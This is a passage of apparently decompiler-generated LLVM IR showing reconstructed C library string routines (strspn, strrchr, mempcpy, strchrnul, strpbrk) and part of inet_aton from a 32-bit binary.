  br i1 %v9_19b60, label %dec_label_pc_19c1c, label %dec_label_pc_19b68

dec_label_pc_19b68:                               ; preds = %dec_label_pc_19b5c
  %v1_19b68 = add i32 %v0_19b68, -1
  %v2_19b6c = icmp eq i32 %v1_19b68, 0
  br i1 %v2_19b6c, label %dec_label_pc_19b7c, label %dec_label_pc_19b74

dec_label_pc_19b74:                               ; preds = %entry, %dec_label_pc_19b68
  %v0_19b68 = phi i32 [ %v1_19b68, %dec_label_pc_19b68 ], [ %arg3, %entry ]
  %v0_19b5c = phi i32 [ %v1_19b5c, %dec_label_pc_19b68 ], [ %v2_19b54, %entry ]
  %v1_19b74 = urem i32 %v0_19b5c, 4
  %v2_19b74 = icmp eq i32 %v1_19b74, 0
  br i1 %v2_19b74, label %dec_label_pc_19b7c, label %dec_label_pc_19b5c

dec_label_pc_19b7c:                               ; preds = %dec_label_pc_19b68, %dec_label_pc_19b74, %entry
  %v0_19c0413 = phi i32 [ %v2_19b54, %entry ], [ %v1_19b5c, %dec_label_pc_19b68 ], [ %v0_19b5c, %dec_label_pc_19b74 ]
  %v0_19bf09 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_19b68 ], [ %v0_19b68, %dec_label_pc_19b74 ]
  %v4_19b7c = mul nuw nsw i32 %v1_19b50, 256
  %v5_19b7c = or i32 %v4_19b7c, %v1_19b50
  %v4_19b80 = mul i32 %v5_19b7c, 65536
  %v5_19b80 = or i32 %v4_19b80, %v5_19b7c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_19bf09, 3
  br i1 %tmp, label %dec_label_pc_19b88, label %dec_label_pc_19c10

dec_label_pc_19b88:                               ; preds = %dec_label_pc_19b7c, %dec_label_pc_19bf0.backedge
  %v0_19ba440 = phi i32 [ %v1_19ba4, %dec_label_pc_19bf0.backedge ], [ %v0_19bf09, %dec_label_pc_19b7c ]
  %v0_19b8839 = phi i32 [ %v1_19b88, %dec_label_pc_19bf0.backedge ], [ %v0_19c0413, %dec_label_pc_19b7c ]
  %v1_19b88 = add i32 %v0_19b8839, -4
  %v2_19b88 = inttoptr i32 %v1_19b88 to i32*
  %v3_19b88 = load i32, i32* %v2_19b88, align 4
  %v2_19b8c = xor i32 %v3_19b88, %v5_19b80
  %v2_19b90 = add i32 %v2_19b8c, 2130640639
  store i32 %v2_19b90, i32* @ip, align 4
  %v1_19b94 = sub i32 -1, %v2_19b8c
  %v2_19b98 = xor i32 %v2_19b90, %v1_19b94
  %v2_19b9c = and i32 %v2_19b98, -2130640640
  %v2_19ba0 = icmp eq i32 %v2_19b9c, 0
  %v1_19ba4 = add i32 %v0_19ba440, -4
  br i1 %v2_19ba0, label %dec_label_pc_19bf0.backedge, label %dec_label_pc_19bac

dec_label_pc_19bf0.backedge:                      ; preds = %dec_label_pc_19b88, %dec_label_pc_19be4
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_19ba4, 3
  br i1 %tmp46, label %dec_label_pc_19b88, label %dec_label_pc_19c10

dec_label_pc_19bac:                               ; preds = %dec_label_pc_19b88
  %v1_19bac = add i32 %v0_19b8839, -1
  %v2_19bac = inttoptr i32 %v1_19bac to i8*
  %v3_19bac = load i8, i8* %v2_19bac, align 1
  %v4_19bac = zext i8 %v3_19bac to i32
  %v9_19bb0 = icmp eq i32 %v4_19bac, %v1_19b50
  br i1 %v9_19bb0, label %dec_label_pc_19bdc, label %dec_label_pc_19bbc

dec_label_pc_19bbc:                               ; preds = %dec_label_pc_19bac
  %v1_19bbc = add i32 %v0_19b8839, -2
  %v2_19bbc = inttoptr i32 %v1_19bbc to i8*
  %v3_19bbc = load i8, i8* %v2_19bbc, align 1
  %v4_19bbc = zext i8 %v3_19bbc to i32
  %v9_19bc0 = icmp eq i32 %v4_19bbc, %v1_19b50
  br i1 %v9_19bc0, label %dec_label_pc_19bdc, label %dec_label_pc_19bcc

dec_label_pc_19bcc:                               ; preds = %dec_label_pc_19bbc
  %v1_19bcc = add i32 %v0_19b8839, -3
  %v2_19bcc = inttoptr i32 %v1_19bcc to i8*
  %v3_19bcc = load i8, i8* %v2_19bcc, align 1
  %v4_19bcc = zext i8 %v3_19bcc to i32
  %v9_19bd0 = icmp eq i32 %v4_19bcc, %v1_19b50
  br i1 %v9_19bd0, label %dec_label_pc_19bdc, label %dec_label_pc_19be4

dec_label_pc_19bdc:                               ; preds = %dec_label_pc_19bcc, %dec_label_pc_19bbc, %dec_label_pc_19bac
  %v0_19bdc = phi i32 [ %v1_19bcc, %dec_label_pc_19bcc ], [ %v1_19bbc, %dec_label_pc_19bbc ], [ %v1_19bac, %dec_label_pc_19bac ]
  br label %dec_label_pc_19c1c

dec_label_pc_19be4:                               ; preds = %dec_label_pc_19bcc
  %v1_19be4 = inttoptr i32 %v1_19b88 to i8*
  %v2_19be4 = load i8, i8* %v1_19be4, align 1
  %v3_19be4 = zext i8 %v2_19be4 to i32
  %v9_19be8 = icmp eq i32 %v3_19be4, %v1_19b50
  br i1 %v9_19be8, label %dec_label_pc_19c1c, label %dec_label_pc_19bf0.backedge

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19c10
  %v1_19c10 = add i32 %v0_19c10, -1
  %v1_19c04 = add i32 %v0_19c04, -1
  %v2_19c04 = inttoptr i32 %v1_19c04 to i8*
  %v3_19c04 = load i8, i8* %v2_19c04, align 1
  %v4_19c04 = zext i8 %v3_19c04 to i32
  %v9_19c08 = icmp eq i32 %v4_19c04, %v1_19b50
  br i1 %v9_19c08, label %dec_label_pc_19c1c, label %dec_label_pc_19c10

dec_label_pc_19c10:                               ; preds = %dec_label_pc_19b7c, %dec_label_pc_19bf0.backedge, %dec_label_pc_19c04
  %v0_19c04 = phi i32 [ %v1_19c04, %dec_label_pc_19c04 ], [ %v0_19c0413, %dec_label_pc_19b7c ], [ %v1_19b88, %dec_label_pc_19bf0.backedge ]
  %v0_19c10 = phi i32 [ %v1_19c10, %dec_label_pc_19c04 ], [ %v0_19bf09, %dec_label_pc_19b7c ], [ %v1_19ba4, %dec_label_pc_19bf0.backedge ]
  %v2_19c10 = icmp eq i32 %v0_19c10, 0
  br i1 %v2_19c10, label %dec_label_pc_19c18, label %dec_label_pc_19c04

dec_label_pc_19c18:                               ; preds = %dec_label_pc_19c10
  br label %dec_label_pc_19c1c

dec_label_pc_19c1c:                               ; preds = %dec_label_pc_19b5c, %dec_label_pc_19be4, %dec_label_pc_19c04, %dec_label_pc_19bdc, %dec_label_pc_19c18
  %v1_19c20 = phi i32 [ %v0_19bdc, %dec_label_pc_19bdc ], [ 0, %dec_label_pc_19c18 ], [ %v1_19c04, %dec_label_pc_19c04 ], [ %v1_19b88, %dec_label_pc_19be4 ], [ %v1_19b5c, %dec_label_pc_19b5c ]
  ret i32 %v1_19c20

; uselistorder directives
  uselistorder i32 %v0_19c10, { 1, 0 }
  uselistorder i32 %v1_19ba4, { 1, 0, 2 }
  uselistorder i32 %v1_19b88, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_19b8839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19b7c, { 1, 0 }
  uselistorder i32 %v0_19bf09, { 1, 2, 0 }
  uselistorder i32 %v0_19b5c, { 1, 0, 2 }
  uselistorder i32 %v2_19b54, { 1, 0 }
  uselistorder i32 %v1_19b50, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19c1c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19c10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19bf0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_19b88, { 1, 0 }
  uselistorder label %dec_label_pc_19b7c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19b74, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_19c5c2 = load i32, i32* @r0, align 4
  %v1_19c5c3 = inttoptr i32 %v0_19c5c2 to i8*
  %v2_19c5c4 = load i8, i8* %v1_19c5c3, align 1
  %v3_19c5c5 = zext i8 %v2_19c5c4 to i32
  store i32 %v3_19c5c5, i32* @ip, align 4
  %v2_19c606 = icmp eq i8 %v2_19c5c4, 0
  br i1 %v2_19c606, label %dec_label_pc_19c6c, label %dec_label_pc_19c40.preheader

dec_label_pc_19c38:                               ; preds = %dec_label_pc_19c40
  %v3_19c40 = zext i8 %v2_19c40 to i32
  %v1_19c48 = add i32 %v0_19c48, 1
  %v9_19c38 = icmp eq i32 %v0_19c3810, %v3_19c40
  br i1 %v9_19c38, label %dec_label_pc_19c54, label %dec_label_pc_19c40

dec_label_pc_19c40:                               ; preds = %dec_label_pc_19c40.preheader, %dec_label_pc_19c38
  %v0_19c48 = phi i32 [ %tmp, %dec_label_pc_19c40.preheader ], [ %v1_19c48, %dec_label_pc_19c38 ]
  %v1_19c40 = inttoptr i32 %v0_19c48 to i8*
  %v2_19c40 = load i8, i8* %v1_19c40, align 1
  %v2_19c44 = icmp eq i8 %v2_19c40, 0
  br i1 %v2_19c44, label %dec_label_pc_19c6c, label %dec_label_pc_19c38

dec_label_pc_19c54:                               ; preds = %dec_label_pc_19c38
  %v1_19c54 = add i32 %v0_19c54, 1
  %v1_19c58 = add i32 %v0_19c58, 1
  %v1_19c5c = inttoptr i32 %v1_19c58 to i8*
  %v2_19c5c = load i8, i8* %v1_19c5c, align 1
  %v3_19c5c = zext i8 %v2_19c5c to i32
  store i32 %v3_19c5c, i32* @ip, align 4
  %v2_19c60 = icmp eq i8 %v2_19c5c, 0
  br i1 %v2_19c60, label %dec_label_pc_19c6c, label %dec_label_pc_19c40.preheader

dec_label_pc_19c40.preheader:                     ; preds = %entry, %dec_label_pc_19c54
  %v0_19c58 = phi i32 [ %v1_19c58, %dec_label_pc_19c54 ], [ %v0_19c5c2, %entry ]
  %v0_19c54 = phi i32 [ %v1_19c54, %dec_label_pc_19c54 ], [ 0, %entry ]
  %v0_19c3810 = phi i32 [ %v3_19c5c, %dec_label_pc_19c54 ], [ %v3_19c5c5, %entry ]
  br label %dec_label_pc_19c40

dec_label_pc_19c6c:                               ; preds = %dec_label_pc_19c54, %dec_label_pc_19c40, %entry
  %v0_19c6c = phi i32 [ 0, %entry ], [ %v0_19c54, %dec_label_pc_19c40 ], [ %v1_19c54, %dec_label_pc_19c54 ]
  ret i32 %v0_19c6c

; uselistorder directives
  uselistorder i32 %v0_19c48, { 1, 0 }
  uselistorder label %dec_label_pc_19c40.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_19c7c = urem i32 %arg2, 256
  store i32 %v1_19c7c, i32* @r4, align 4
  %v2_19c7c = icmp eq i32 %v1_19c7c, 0
  br i1 %v2_19c7c, label %dec_label_pc_19c90, label %dec_label_pc_19ca4.preheader

dec_label_pc_19ca4.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_19cac3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_19c7c)
  %v2_19cb05 = icmp eq i32 %v2_19cac3, 0
  br i1 %v2_19cb05, label %dec_label_pc_19cb8, label %dec_label_pc_19c9c

dec_label_pc_19c90:                               ; preds = %entry
  %v2_19c94 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_19cbc

dec_label_pc_19c9c:                               ; preds = %dec_label_pc_19ca4.preheader, %dec_label_pc_19c9c
  %v2_19cac6 = phi i32 [ %v2_19cac, %dec_label_pc_19c9c ], [ %v2_19cac3, %dec_label_pc_19ca4.preheader ]
  store i32 %v2_19cac6, i32* @r5, align 4
  %v1_19ca0 = add i32 %v2_19cac6, 1
  store i32 %v1_19ca0, i32* @r0, align 4
  %v0_19ca8 = load i32, i32* @r4, align 4
  %v2_19cac = call i32 @__GI_strchr(i32 %v1_19ca0, i32 %v0_19ca8)
  %v2_19cb0 = icmp eq i32 %v2_19cac, 0
  br i1 %v2_19cb0, label %dec_label_pc_19cb8, label %dec_label_pc_19c9c

dec_label_pc_19cb8:                               ; preds = %dec_label_pc_19c9c, %dec_label_pc_19ca4.preheader
  %v0_19cb8 = load i32, i32* @r5, align 4
  br label %dec_label_pc_19cbc

dec_label_pc_19cbc:                               ; preds = %dec_label_pc_19c90, %dec_label_pc_19cb8
  %storemerge = phi i32 [ %v2_19c94, %dec_label_pc_19c90 ], [ %v0_19cb8, %dec_label_pc_19cb8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_19cac, { 1, 0 }
  uselistorder i32 %v1_19ca0, { 1, 0 }
  uselistorder i32 %v1_19c7c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_19cbc, { 1, 0 }
  uselistorder label %dec_label_pc_19c9c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_19cc8 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_19cd8 = call i32 @memcpy()
  %v0_19cdc = load i32, i32* @r5, align 4
  %v1_19cdc = load i32, i32* @r4, align 4
  %v2_19cdc = add i32 %v1_19cdc, %v0_19cdc
  store i32 %v6_19cc8, i32* @r5, align 4
  ret i32 %v2_19cdc
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_19cf0 = urem i32 %arg1, 256
  %v0_19d102 = load i32, i32* @r0, align 4
  %v1_19d103 = urem i32 %v0_19d102, 4
  %v2_19d104 = icmp eq i32 %v1_19d103, 0
  br i1 %v2_19d104, label %dec_label_pc_19d18, label %dec_label_pc_19cf8

dec_label_pc_19cf8:                               ; preds = %entry, %dec_label_pc_19d0c
  %v0_19d0c = phi i32 [ %v1_19d0c, %dec_label_pc_19d0c ], [ %v0_19d102, %entry ]
  %v1_19cf8 = inttoptr i32 %v0_19d0c to i8*
  %v2_19cf8 = load i8, i8* %v1_19cf8, align 1
  %v3_19cf8 = zext i8 %v2_19cf8 to i32
  %v9_19cfc = icmp eq i32 %v3_19cf8, %v1_19cf0
  br i1 %v9_19cfc, label %dec_label_pc_19dc8, label %dec_label_pc_19d04

dec_label_pc_19d04:                               ; preds = %dec_label_pc_19cf8
  %v2_19d04 = icmp eq i8 %v2_19cf8, 0
  br i1 %v2_19d04, label %dec_label_pc_19dc8, label %dec_label_pc_19d0c

dec_label_pc_19d0c:                               ; preds = %dec_label_pc_19d04
  %v1_19d0c = add i32 %v0_19d0c, 1
  %v1_19d10 = urem i32 %v1_19d0c, 4
  %v2_19d10 = icmp eq i32 %v1_19d10, 0
  br i1 %v2_19d10, label %dec_label_pc_19d18, label %dec_label_pc_19cf8

dec_label_pc_19d18:                               ; preds = %dec_label_pc_19d0c, %entry
  %v0_19d1c = phi i32 [ %v0_19d102, %entry ], [ %v1_19d0c, %dec_label_pc_19d0c ]
  %v4_19d18 = mul nuw nsw i32 %v1_19cf0, 256
  %v5_19d18 = or i32 %v4_19d18, %v1_19cf0
  %v4_19d20 = mul i32 %v5_19d18, 65536
  %v5_19d20 = or i32 %v4_19d20, %v5_19d18
  br label %dec_label_pc_19d24

dec_label_pc_19d24:                               ; preds = %dec_label_pc_19dc0, %dec_label_pc_19d60, %dec_label_pc_19d18
  %v0_19d88 = phi i32 [ %v0_19d1c, %dec_label_pc_19d18 ], [ %v4_19d24, %dec_label_pc_19d60 ], [ %v4_19d24, %dec_label_pc_19dc0 ]
  %v1_19d24 = inttoptr i32 %v0_19d88 to i32*
  %v2_19d24 = load i32, i32* %v1_19d24, align 4
  %v4_19d24 = add i32 %v0_19d88, 4
  %v2_19d2c = xor i32 %v2_19d24, %v5_19d20
  %v2_19d30 = add i32 %v2_19d2c, 2130640639
  store i32 %v2_19d30, i32* @ip, align 4
  %v2_19d38 = add i32 %v2_19d24, 2130640639
  %v1_19d3c = sub i32 -1, %v2_19d24
  %v2_19d40 = xor i32 %v2_19d38, %v1_19d3c
  %v2_19d4c = and i32 %v2_19d40, -2130640640
  %v2_19d54 = icmp eq i32 %v2_19d4c, 0
  br i1 %v2_19d54, label %dec_label_pc_19d60, label %dec_label_pc_19d68

dec_label_pc_19d60:                               ; preds = %dec_label_pc_19d24
  %v1_19d48 = sub i32 -1, %v2_19d2c
  %v2_19d50 = xor i32 %v2_19d30, %v1_19d48
  %v2_19d58 = and i32 %v2_19d50, -2130640640
  %v2_19d60 = icmp eq i32 %v2_19d58, 0
  br i1 %v2_19d60, label %dec_label_pc_19d24, label %dec_label_pc_19d68

dec_label_pc_19d68:                               ; preds = %dec_label_pc_19d24, %dec_label_pc_19d60
  %v2_19d68 = inttoptr i32 %v0_19d88 to i8*
  %v3_19d68 = load i8, i8* %v2_19d68, align 1
  %v4_19d68 = zext i8 %v3_19d68 to i32
  %v9_19d6c = icmp eq i32 %v4_19d68, %v1_19cf0
  br i1 %v9_19d6c, label %dec_label_pc_19dc8, label %dec_label_pc_19d78

dec_label_pc_19d78:                               ; preds = %dec_label_pc_19d68
  %v2_19d78 = icmp eq i8 %v3_19d68, 0
  br i1 %v2_19d78, label %dec_label_pc_19dc8, label %dec_label_pc_19d80

dec_label_pc_19d80:                               ; preds = %dec_label_pc_19d78
  %v1_19d80 = add i32 %v0_19d88, 1
  %v2_19d80 = inttoptr i32 %v1_19d80 to i8*
  %v3_19d80 = load i8, i8* %v2_19d80, align 1
  %v4_19d80 = zext i8 %v3_19d80 to i32
  %v9_19d84 = icmp eq i32 %v4_19d80, %v1_19cf0
  br i1 %v9_19d84, label %dec_label_pc_19dc8, label %dec_label_pc_19d90

dec_label_pc_19d90:                               ; preds = %dec_label_pc_19d80
  %v2_19d90 = icmp eq i8 %v3_19d80, 0
  br i1 %v2_19d90, label %dec_label_pc_19dc8, label %dec_label_pc_19d98

dec_label_pc_19d98:                               ; preds = %dec_label_pc_19d90
  %v1_19d98 = add i32 %v0_19d88, 2
  %v2_19d98 = inttoptr i32 %v1_19d98 to i8*
  %v3_19d98 = load i8, i8* %v2_19d98, align 1
  %v4_19d98 = zext i8 %v3_19d98 to i32
  %v9_19d9c = icmp eq i32 %v4_19d98, %v1_19cf0
  br i1 %v9_19d9c, label %dec_label_pc_19dc8, label %dec_label_pc_19da8

dec_label_pc_19da8:                               ; preds = %dec_label_pc_19d98
  %v2_19da8 = icmp eq i8 %v3_19d98, 0
  br i1 %v2_19da8, label %dec_label_pc_19dc8, label %dec_label_pc_19db0

dec_label_pc_19db0:                               ; preds = %dec_label_pc_19da8
  %v1_19db0 = add i32 %v0_19d88, 3
  %v2_19db0 = inttoptr i32 %v1_19db0 to i8*
  %v3_19db0 = load i8, i8* %v2_19db0, align 1
  %v4_19db0 = zext i8 %v3_19db0 to i32
  %v9_19db4 = icmp eq i32 %v4_19db0, %v1_19cf0
  br i1 %v9_19db4, label %dec_label_pc_19dc8, label %dec_label_pc_19dc0

dec_label_pc_19dc0:                               ; preds = %dec_label_pc_19db0
  %v2_19dc0 = icmp eq i8 %v3_19db0, 0
  br i1 %v2_19dc0, label %dec_label_pc_19dc8, label %dec_label_pc_19d24

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19d04, %dec_label_pc_19cf8, %dec_label_pc_19dc0, %dec_label_pc_19db0, %dec_label_pc_19da8, %dec_label_pc_19d98, %dec_label_pc_19d90, %dec_label_pc_19d80, %dec_label_pc_19d78, %dec_label_pc_19d68
  %v1_19dcc = phi i32 [ %v1_19db0, %dec_label_pc_19dc0 ], [ %v1_19db0, %dec_label_pc_19db0 ], [ %v1_19d98, %dec_label_pc_19da8 ], [ %v1_19d98, %dec_label_pc_19d98 ], [ %v1_19d80, %dec_label_pc_19d90 ], [ %v1_19d80, %dec_label_pc_19d80 ], [ %v0_19d88, %dec_label_pc_19d78 ], [ %v0_19d88, %dec_label_pc_19d68 ], [ %v0_19d0c, %dec_label_pc_19cf8 ], [ %v0_19d0c, %dec_label_pc_19d04 ]
  ret i32 %v1_19dcc

; uselistorder directives
  uselistorder i32 %v4_19d24, { 1, 0 }
  uselistorder i32 %v2_19d24, { 0, 2, 1 }
  uselistorder i32 %v0_19d88, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_19d18, { 1, 0 }
  uselistorder i32 %v1_19d0c, { 1, 0, 2 }
  uselistorder i32 %v0_19d102, { 2, 1, 0 }
  uselistorder i32 %v1_19cf0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_19dc8, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_19d68, { 1, 0 }
  uselistorder label %dec_label_pc_19cf8, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19e04

dec_label_pc_19de0:                               ; preds = %dec_label_pc_19df0
  %v3_19df0 = zext i8 %v2_19df0 to i32
  %v1_19df8 = add i32 %v0_19df8, 1
  %v1_19de0 = load i32, i32* %r0.global-to-local, align 4
  %v9_19de0 = icmp eq i32 %v3_19df0, %v1_19de0
  br i1 %v9_19de0, label %dec_label_pc_19de8, label %dec_label_pc_19df0

dec_label_pc_19de8:                               ; preds = %dec_label_pc_19de0
  %v0_19de8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19de8, i32* %r0.global-to-local, align 4
  ret i32 %v0_19de8

dec_label_pc_19df0:                               ; preds = %dec_label_pc_19de0, %dec_label_pc_19e04
  %v0_19df8 = phi i32 [ %v1_19df8, %dec_label_pc_19de0 ], [ %arg2, %dec_label_pc_19e04 ]
  %v1_19df0 = inttoptr i32 %v0_19df8 to i8*
  %v2_19df0 = load i8, i8* %v1_19df0, align 1
  %v2_19df4 = icmp eq i8 %v2_19df0, 0
  br i1 %v2_19df4, label %dec_label_pc_19e00, label %dec_label_pc_19de0

dec_label_pc_19e00:                               ; preds = %dec_label_pc_19df0
  %v0_19e00 = load i32, i32* %r2.global-to-local, align 4
  %v1_19e00 = add i32 %v0_19e00, 1
  br label %dec_label_pc_19e04

dec_label_pc_19e04:                               ; preds = %entry, %dec_label_pc_19e00
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_19e00, %dec_label_pc_19e00 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_19e04 = inttoptr i32 %storemerge to i8*
  %v2_19e04 = load i8, i8* %v1_19e04, align 1
  %v3_19e04 = zext i8 %v2_19e04 to i32
  store i32 %v3_19e04, i32* %r0.global-to-local, align 4
  %v2_19e08 = icmp eq i8 %v2_19e04, 0
  %v0_19e0c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_19e08, i32 %v0_19e0c)
  br label %dec_label_pc_19df0

; uselistorder directives
  uselistorder i32 %v0_19df8, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_19e04, { 1, 0 }
  uselistorder label %dec_label_pc_19df0, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_19e18 = load i32, i32* @r4, align 4
  store i32 %v3_19e18, i32* %stack_var_-28, align 4
  %v0_19e20 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e20 = icmp eq i32 %v0_19e20, 0
  br i1 %v2_19e20, label %dec_label_pc_19efc, label %dec_label_pc_19e30

dec_label_pc_19e30:                               ; preds = %entry
  br label %dec_label_pc_19e48

dec_label_pc_19e48:                               ; preds = %dec_label_pc_19e30, %dec_label_pc_19ec0
  %v1_19ec0 = phi i32 [ 0, %dec_label_pc_19e30 ], [ %v5_19ec0, %dec_label_pc_19ec0 ]
  %v0_19ec4 = phi i32 [ 1, %dec_label_pc_19e30 ], [ %v1_19ec4, %dec_label_pc_19ec0 ]
  %v0_19e48 = phi i32 [ %v0_19e20, %dec_label_pc_19e30 ], [ %v0_19e4812, %dec_label_pc_19ec0 ]
  %v1_19e48 = inttoptr i32 %v0_19e48 to i8*
  %v2_19e48 = load i8, i8* %v1_19e48, align 1
  %v3_19e48 = zext i8 %v2_19e48 to i32
  %v4_19e4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 744) to i32*), align 4
  %v2_19e50 = mul nuw nsw i32 %v3_19e48, 2
  %v2_19e54 = add i32 %v2_19e50, %v4_19e4c
  %v3_19e54 = inttoptr i32 %v2_19e54 to i16*
  %v4_19e54 = load i16, i16* %v3_19e54, align 2
  %v1_19e58 = and i16 %v4_19e54, 8
  %v2_19e58 = icmp eq i16 %v1_19e58, 0
  br i1 %v2_19e58, label %dec_label_pc_19efc, label %dec_label_pc_19e60

dec_label_pc_19e60:                               ; preds = %dec_label_pc_19e48
  br label %dec_label_pc_19e80

dec_label_pc_19e68:                               ; preds = %dec_label_pc_19e80
  %v2_19e68 = mul i32 %v0_19ec0, 10
  %v1_19e6c = add i32 %v2_19e68, -48
  %v2_19e70 = add i32 %v3_19e80, %v1_19e6c
  %v8_19e78 = icmp sgt i32 %v2_19e70, 255
  br i1 %v8_19e78, label %dec_label_pc_19efc, label %dec_label_pc_19e7c

dec_label_pc_19e7c:                               ; preds = %dec_label_pc_19e68
  %v1_19e7c = add i32 %v0_19eb0, 1
  store i32 %v1_19e7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19e80

dec_label_pc_19e80:                               ; preds = %dec_label_pc_19e60, %dec_label_pc_19e7c
  %v0_19ec0 = phi i32 [ 0, %dec_label_pc_19e60 ], [ %v2_19e70, %dec_label_pc_19e7c ]
  %v0_19eb0 = phi i32 [ %v0_19e48, %dec_label_pc_19e60 ], [ %v1_19e7c, %dec_label_pc_19e7c ]
  %v1_19e80 = inttoptr i32 %v0_19eb0 to i8*
  %v2_19e80 = load i8, i8* %v1_19e80, align 1
  %v3_19e80 = zext i8 %v2_19e80 to i32
  %v2_19e84 = mul nuw nsw i32 %v3_19e80, 2
  %v2_19e88 = add i32 %v2_19e84, %v4_19e4c
  %v3_19e88 = inttoptr i32 %v2_19e88 to i16*
  %v4_19e88 = load i16, i16* %v3_19e88, align 2
  %v6_19e88 = zext i16 %v4_19e88 to i32
  %v1_19e8c = and i32 %v6_19e88, 8
  %v2_19e8c = icmp eq i32 %v1_19e8c, 0
  br i1 %v2_19e8c, label %dec_label_pc_19e94, label %dec_label_pc_19e68

dec_label_pc_19e94:                               ; preds = %dec_label_pc_19e80
  %v7_19e94 = icmp eq i32 %v0_19ec4, 4
  br i1 %v7_19e94, label %dec_label_pc_19eac, label %dec_label_pc_19e9c

dec_label_pc_19e9c:                               ; preds = %dec_label_pc_19e94
  %v7_19e9c = icmp eq i8 %v2_19e80, 46
  br i1 %v7_19e9c, label %dec_label_pc_19ea4, label %dec_label_pc_19efc

dec_label_pc_19ea4:                               ; preds = %dec_label_pc_19e9c
  %v1_19ea4 = add i32 %v0_19eb0, 1
  store i32 %v1_19ea4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19ec0

dec_label_pc_19eac:                               ; preds = %dec_label_pc_19e94
  %v2_19eac = icmp eq i8 %v2_19e80, 0
  %v1_19eb0 = add i32 %v0_19eb0, 1
  store i32 %v1_19eb0, i32* %r0.global-to-local, align 4
  br i1 %v2_19eac, label %dec_label_pc_19ec0, label %dec_label_pc_19eb8

dec_label_pc_19eb8:                               ; preds = %dec_label_pc_19eac
  %v1_19eb8 = and i32 %v6_19e88, 32
  %v2_19eb8 = icmp eq i32 %v1_19eb8, 0
  br i1 %v2_19eb8, label %dec_label_pc_19efc, label %dec_label_pc_19ec0

dec_label_pc_19ec0:                               ; preds = %dec_label_pc_19eb8, %dec_label_pc_19eac, %dec_label_pc_19ea4
  %v0_19e4812 = phi i32 [ %v1_19eb0, %dec_label_pc_19eb8 ], [ %v1_19eb0, %dec_label_pc_19eac ], [ %v1_19ea4, %dec_label_pc_19ea4 ]
  %v4_19ec0 = mul i32 %v1_19ec0, 256
  %v5_19ec0 = or i32 %v0_19ec0, %v4_19ec0
  %v1_19ec4 = add nuw nsw i32 %v0_19ec4, 1
  %v7_19ecc = icmp slt i32 %v1_19ec4, 5
  br i1 %v7_19ecc, label %dec_label_pc_19e48, label %dec_label_pc_19ed0

dec_label_pc_19ed0:                               ; preds = %dec_label_pc_19ec0
  %v2_19ed0 = icmp eq i32 %arg2, 0
  br i1 %v2_19ed0, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_19ed0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19f00

bb:                                               ; preds = %dec_label_pc_19ed0
  %v4_19ed4 = udiv i32 %v5_19ec0, 16777216
  %v2_19ed8 = udiv i32 %v5_19ec0, 256
